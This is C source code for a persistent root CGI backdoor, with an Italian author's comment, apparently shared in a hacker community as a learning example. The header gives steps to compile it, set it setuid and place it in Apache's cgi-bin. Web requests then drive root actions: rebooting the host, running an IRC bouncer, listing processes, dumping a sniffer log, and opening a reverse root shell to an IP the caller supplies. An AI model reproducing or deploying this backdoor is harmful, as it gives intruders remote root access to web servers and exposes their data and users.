/*
* CGI BACKDOOR By DarK-Elf
* Questo è solo un esempio di codice e personalmente uno dei mei primi
* esperimenti col C e assolutamente il PRIMISSIMO CGI ke ho fatto
* perdonatemi lo stile di programmazione penoso ma sto iniziando ora
* chiedo umilmente perdono a
* R3cidivo perkè mi sono rippato la dup2 dal suo ranzou 
* ma era + komodo ke mettere anke quello con una system() :P 
* |CyRaX| A-SyNcHr0 Cthulhu <=- raga + difficili i nick no?
* perkè senza la loro consulensa [ciro] libri e codice vario 
* non sarei mai stato capace di tirare giu manko na riga di C
* ultimo grazie a FuSyS per questo motivo:
*
* <DarK-Elf> io il C lo so solo leggere non lo so skrivere
* <FuSyS> allora sei sulla buona strada sei solo pigro
* Questo è quanto... io vi ho dato l'idea mo sviluppatevela!!!!
*						DarK-Elf
*
* --------------------------------------------------------------------------
*	Bash~# gcc -o bd-cgi bd-cgi.c	
*	Bash~# chmod +s bd-cgi
*	Bash~# mv bd-cgi /var/lib/apache/cgi-bin/bd-cgi
*
*	Questo codice e' scritto per NEWBIES se volete saperne d + 
* 			LEGGETEVI L'ARTICOLO :P
* --------------------------------------------------------------------------
*/




#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>




#define PATH007 "/tmp/007/007" 
#define PATHEJECT "/usr/bin/eject"
#define CDROMDEVICE "/dev/cdrom"
#define PATHREBOOT "/sbin/reboot"
#define PATHPSY "/tmp/psy/psybnc/"
#define PSYNAME "psybnc"
#define PATHPS "/bin/ps"
#define PATHW "/usr/bin/w"
#define SNIFFLOG "/tmp/pippotto.tmp"


void callme(char *you) {
int sux;

struct sockaddr_in suxdata;
suxdata.sin_port = htons(6969);
suxdata.sin_family = AF_INET;
suxdata.sin_addr.s_addr = inet_addr(you);

if ((sux = socket (AF_INET,SOCK_STREAM,0)) < 0){
perror ("socket");
exit (0);
}

if (connect(sux, (struct sockaddr *) &suxdata, sizeof(suxdata)) < 0){
perror ("connect");
exit(0);
}

//link std* to sock 10x R3ci :P
dup2 (sux,0);
dup2 (sux,1);
dup2 (sux,2);
system ("/bin/bash -i");
close(sux);
}





void closehtml () {
printf("</h1></center></body></html>");
exit(0);
}


main (int argc, char *argv[]) {
FILE *df1;
int kar;
char *tmparg;

setuid(0);
setgid(0);

printf ("Content-type: text/html\n\n");
printf("<html>\n");
printf("<body>\n");
printf("<h1><center>\n");

if (argc < 1) 
	{
	closehtml();	
	}

if (argc > 1)

{

if (strcmp("ejectcd",argv[1]) == 0)
	{
	printf("Sputazzed out but very very out babe!\n");
	sprintf(tmparg,"%s %s >> /dev/null",PATHEJECT, CDROMDEVICE);
	system(tmparg);
	closehtml();
	}

if(strcmp("reboot",argv[1]) == 0)
	{
	printf("Broadcast SUX from CGI r00t");
	sprintf(tmparg,"%s >> /dev/null",PATHREBOOT);
        system(tmparg);
	closehtml();
	}

if(strcmp("psy",argv[1]) == 0)
	{
	if(strcmp("start",argv[2]) == 0)
		{
		printf("Starting PsyBnC...<br>");
		sprintf(tmparg,"cd %s; ./%s >> /dev/null",PATHPSY, PSYNAME);
        	printf(tmparg);
		system(tmparg);
		closehtml();
		}
	if(strcmp("restart",argv[2]) == 0)
		{
		printf("Kill PsyBnC<br>");
                sprintf(tmparg,"killall -9 %s>> /dev/null",PSYNAME);
		system(tmparg);  
                sprintf(tmparg,"cd %s; ./%s >> /dev/null",PATHPSY, PSYNAME);
		printf("Restarting PsyBnC<br>");
		closehtml();
		}
	if(strcmp("stop",argv[2]) == 0)
		{
                sprintf(tmparg,"killall -9 %s>> /dev/null",PSYNAME);
                system(tmparg);
		printf("Kill PsyBnC<br>");
		printf(tmparg);	
		closehtml();
		}
	}
if (strcmp("ps",argv[1]) == 0)
	{
	printf("</center></h1><pre>");
	sprintf(tmparg,"%s -ax",PATHPS);
	df1 = popen(tmparg,"r");
	while((kar = fgetc(df1))!=EOF)
	putchar(kar);
	pclose(df1);
	closehtml();
	}

if (strcmp("007",argv[1]) == 0)
	{
	printf("G0 Covert!<br>");
	sprintf(tmparg,"%s -s >> /dev/null",PATH007);
	system(tmparg);
        closehtml();
	}
if (strcmp("whois",argv[1]) == 0)
        {
        printf("</center></h1><pre>");
        df1 = popen(PATHW,"r");
        while((kar = fgetc(df1))!=EOF)
        putchar(kar);
        pclose(df1);
        closehtml();
	}

if (strcmp("sniflog",argv[1]) == 0)
        {
        printf("</center></h1><pre>");
        df1 = fopen(SNIFFLOG,"r");
        while((kar = fgetc(df1))!=EOF)
        putchar(kar);
        fclose(df1);
        closehtml();
        }
if (strcmp("callme",argv[1]) == 0)
	{
	printf("Look your incoming connection :P");
	printf("</h1></center></body></html>");
	fork();
	callme(argv[2]);
	exit(0);
	}


printf ("CGI error see manual");
closehtml();
}
}
